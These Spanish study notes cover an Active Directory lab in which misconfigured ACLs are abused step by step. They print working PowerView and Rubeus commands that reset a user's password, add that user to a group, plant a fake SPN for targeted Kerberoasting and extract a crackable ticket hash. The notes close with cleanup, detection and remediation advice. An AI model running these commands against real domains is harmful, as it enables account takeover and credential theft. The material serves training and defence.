
## 1. Cadena de ataque del laboratorio

**Objetivo:** pasar de `wley` a `damundsen`, después aprovechar la pertenencia a grupos anidados y los permisos ACL para comprometer `adunn`.

1. `**wley**` **→** `**damundsen**`**:** aprovechar `ForceChangePassword` para cambiar la contraseña de `damundsen`.
    
2. `**damundsen**` **→** `**Help Desk Level 1**`**:** aprovechar `GenericWrite` y añadir `damundsen` al grupo.
    
3. **Grupo anidado →** `**adunn**`**:** aprovechar los permisos heredados mediante la pertenencia a grupos y usar `GenericAll` para modificar el atributo `servicePrincipalName` de `adunn`.
    
4. **Targeted Kerberoasting:** solicitar un ticket TGS para obtener un hash que se pueda intentar crackear offline.
    
5. **Objetivo posterior:** autenticarse como `adunn` y realizar DCSync, si los permisos lo permiten.
    

> La pertenencia a grupos anidados puede conceder permisos indirectos. No basta con comprobar únicamente los permisos asignados directamente a un usuario.

## 2. Cambiar la contraseña de un usuario con PowerView

Si controlamos un usuario que tiene `ForceChangePassword` sobre otro, podemos restablecer su contraseña sin conocer la anterior.

### Crear las credenciales de `wley`

```
$SecPassword = ConvertTo-SecureString '<PASSWORD_WLEY>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(
    'INLANEFREIGHT\wley',
    $SecPassword
)
```

### Crear la contraseña nueva

```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

### Restablecer la contraseña de `damundsen`

```
Import-Module .\PowerView.ps1

Set-DomainUserPassword `
    -Identity damundsen `
    -AccountPassword $damundsenPassword `
    -Credential $Cred `
    -Verbose
```

**Puntos clave:**

- `-Identity`: usuario cuya contraseña queremos cambiar.
    
- `-AccountPassword`: nueva contraseña en formato `SecureString`.
    
- `-Credential`: credenciales del usuario que tiene el permiso ACL.
    
- `-Verbose`: muestra información adicional sobre la ejecución.

## 3. Añadir un usuario a un grupo

Una vez controlamos `damundsen`, podemos utilizar sus permisos para añadirlo al grupo `Help Desk Level 1`.

### Crear las credenciales de `damundsen`

```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential(
    'INLANEFREIGHT\damundsen',
    $SecPassword
)
```

### Comprobar los miembros del grupo

```
Get-ADGroup -Identity "Help Desk Level 1" -Properties * |
    Select-Object -ExpandProperty Members
```

### Añadir el usuario al grupo

```
Add-DomainGroupMember `
    -Identity 'Help Desk Level 1' `
    -Members 'damundsen' `
    -Credential $Cred2 `
    -Verbose
```

### Verificar la pertenencia

```
Get-DomainGroupMember -Identity "Help Desk Level 1" |
    Select-Object MemberName
```

**Importante:** la posibilidad de modificar la membresía depende de los permisos efectivos sobre el grupo. En este escenario, la cadena de ataque aprovecha `GenericWrite` y los permisos disponibles en el entorno.

## 4. Abusar de `GenericAll` mediante grupos anidados

El objetivo siguiente es `adunn`.

En el escenario del laboratorio, la pertenencia de `damundsen` al grupo `Help Desk Level 1` permite aprovechar una relación de grupos anidados para obtener los permisos necesarios asociados a `Information Technology`.

`GenericAll` concede control amplio sobre el objeto afectado. En una cuenta de usuario, puede permitir modificar atributos como `servicePrincipalName`, siempre que los permisos efectivos y la configuración del objeto lo permitan.

### Añadir un SPN ficticio a `adunn`

```
Set-DomainObject `
    -Credential $Cred2 `
    -Identity adunn `
    -SET @{serviceprincipalname='notahacker/LEGIT'} `
    -Verbose
```

El SPN ficticio hace que la cuenta pueda ser objetivo de Kerberoasting.

**Concepto importante:**

- `GenericAll`: control amplio sobre el objeto.
    
- `GenericWrite`: permite modificar determinados atributos del objeto.
    
- `servicePrincipalName`: atributo utilizado para asociar una cuenta a un servicio.
    
- **Targeted Kerberoasting:** en este escenario, se añade temporalmente un SPN a una cuenta y se solicita su ticket TGS para obtener material susceptible de crackeo offline.

## 5. Kerberoasting con Rubeus

Con el SPN establecido, podemos solicitar el ticket TGS de `adunn`.

```
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

En el resultado, buscar:

```
SamAccountName
ServicePrincipalName
Supported ETypes
Hash
```

El hash tendrá un formato parecido a:

```
$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$...
```

El valor completo se puede guardar para intentar crackearlo offline con Hashcat.

**Consideraciones:**

- El tipo de cifrado depende de la configuración de la cuenta y del dominio.
    
- El hash no garantiza que la contraseña se pueda recuperar.
    
- El éxito depende de la fortaleza de la contraseña y de los recursos disponibles para el crackeo.
    

El siguiente paso de la cadena sería autenticarse como `adunn` si se recupera su contraseña y comprobar si dispone de los permisos necesarios para realizar DCSync.

## 6. Limpieza de los cambios

Las modificaciones deben revertirse y documentarse. En este escenario, **hay que eliminar primero el SPN ficticio y después retirar a** `**damundsen**` **del grupo**, porque necesitamos conservar los permisos para realizar la primera operación.

### 6.1. Eliminar el SPN ficticio

```
Set-DomainObject `
    -Credential $Cred2 `
    -Identity adunn `
    -Clear serviceprincipalname `
    -Verbose
```

**Precaución:** `-Clear serviceprincipalname` elimina el atributo completo. Si la cuenta tenía SPN legítimos, también podrían eliminarse. Antes de modificarlo, hay que registrar su valor original y restaurarlo correctamente al finalizar.

### 6.2. Retirar a `damundsen` del grupo

```
Remove-DomainGroupMember `
    -Identity "Help Desk Level 1" `
    -Members 'damundsen' `
    -Credential $Cred2 `
    -Verbose
```

### 6.3. Confirmar la eliminación

```
Get-DomainGroupMember -Identity "Help Desk Level 1" |
    Where-Object { $_.MemberName -eq 'damundsen' } |
    Select-Object MemberName
```

Si no devuelve resultados, `damundsen` ya no aparece como miembro directo del grupo.

### 6.4. Restaurar la contraseña

Si se modificó la contraseña de `damundsen`, hay que restaurar la original si se conoce y sigue siendo apropiado hacerlo, o coordinar un restablecimiento con el cliente.

**Regla para evaluaciones:**

- Registrar el estado inicial de los atributos modificados.
    
- Documentar todas las acciones y los resultados.
    
- Revertir los cambios autorizados.
    
- No asumir que una operación de limpieza es segura sin conocer los valores originales.

## 7. Detección de cambios en Active Directory

### Evento 5136

El evento **5136 — A directory service object was modified** registra modificaciones de objetos de Active Directory cuando la auditoría correspondiente está configurada.

Puede ayudar a detectar cambios en:

- Atributos de usuarios.
    
- Membresías y objetos de grupos.
    
- Configuración de objetos del dominio.
    
- Descriptores de seguridad y ACL, según el objeto y la auditoría configurada.
    

El evento no demuestra por sí solo que haya ocurrido un ataque: hay que correlacionarlo con el usuario que realizó el cambio, el objeto afectado, la hora y la actividad relacionada.

### Revisar la configuración de seguridad en SDDL

Los descriptores de seguridad pueden aparecer en formato **SDDL** (_Security Descriptor Definition Language_), que no resulta especialmente legible.

PowerShell permite convertirlos a una representación más comprensible:

```
ConvertFrom-SddlString '<SDDL>'
```

Entre las propiedades que devuelve están:

- `Owner`: propietario del objeto.
    
- `Group`: grupo principal asociado al descriptor.
    
- `DiscretionaryAcl`: permisos de acceso.
    
- `SystemAcl`: reglas de auditoría.
    
- `RawDescriptor`: descriptor de seguridad original.
    

Para investigar una posible modificación sospechosa, hay que examinar los permisos afectados e identificar qué principal los recibió. Una ACL con permisos excesivos sobre el objeto del dominio puede facilitar una escalada importante.

## 8. Remediación

### Auditar las ACL

- Revisar regularmente las ACL de usuarios, grupos, equipos y objetos del dominio.
    
- Identificar permisos excesivos, especialmente `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner` y `ForceChangePassword`.
    
- Eliminar o restringir permisos que no sean necesarios.
    
- Revisar tanto las asignaciones directas como los permisos obtenidos por herencia y grupos anidados.
    

### Supervisar grupos importantes

- Monitorizar los cambios de membresía en grupos privilegiados o con acceso a sistemas críticos.
    
- Alertar ante incorporaciones inesperadas de usuarios a grupos sensibles.
    
- Revisar si una cuenta puede modificar grupos que indirectamente proporcionen acceso privilegiado.
    

### Auditar modificaciones de objetos

- Habilitar y configurar la auditoría de seguridad correspondiente.
    
- Supervisar el evento 5136 y correlacionarlo con otros eventos.
    
- Investigar cambios inesperados en atributos como `servicePrincipalName`.
    
- Registrar quién modificó un objeto, qué cambió y cuándo ocurrió.
    

### Utilizar BloodHound

BloodHound ayuda a visualizar relaciones entre usuarios, grupos, objetos y permisos ACL. Es especialmente útil para detectar rutas de ataque que no resultan evidentes al revisar únicamente los permisos directos de cada usuario.

## 9. Checklist práctico para el laboratorio

1. Identificar una ACL que permita actuar sobre otro objeto.
    
2. Determinar el usuario o grupo que posee el permiso.
    
3. Revisar la pertenencia a grupos anidados y los permisos efectivos.
    
4. Comprobar qué operación permite el derecho ACL.
    
5. Ejecutar únicamente las modificaciones autorizadas.
    
6. Verificar el resultado después de cada paso.
    
7. Registrar los valores originales de los atributos modificados.
    
8. Evaluar si el acceso obtenido permite continuar la cadena de ataque.
    
9. Limpiar los cambios sin eliminar configuraciones legítimas.
    
10. Documentar los hallazgos y recomendar la corrección de los permisos excesivos.
    

## Conceptos que debes recordar

|Permiso o técnica|Aplicación en el escenario|
|---|---|
|`ForceChangePassword`|Restablecer la contraseña de otro usuario sin conocer la anterior.|
|`GenericWrite`|Modificar atributos permitidos de un objeto.|
|`GenericAll`|Control amplio sobre el objeto al que se aplica.|
|Grupos anidados|Pueden conceder permisos indirectos a sus miembros.|
|`servicePrincipalName`|Atributo que se modifica para preparar el targeted Kerberoasting.|
|Rubeus `kerberoast`|Solicitar tickets TGS y obtener hashes para intentar crackearlos offline.|
|Evento 5136|Registrar modificaciones de objetos de Active Directory cuando la auditoría está configurada.|
|SDDL|Representación textual de descriptores de seguridad.|

**Idea clave:** una ACL aparentemente secundaria puede iniciar una cadena de escalada si permite cambiar contraseñas, modificar atributos o añadir miembros a grupos que heredan permisos sobre cuentas más privilegiadas.
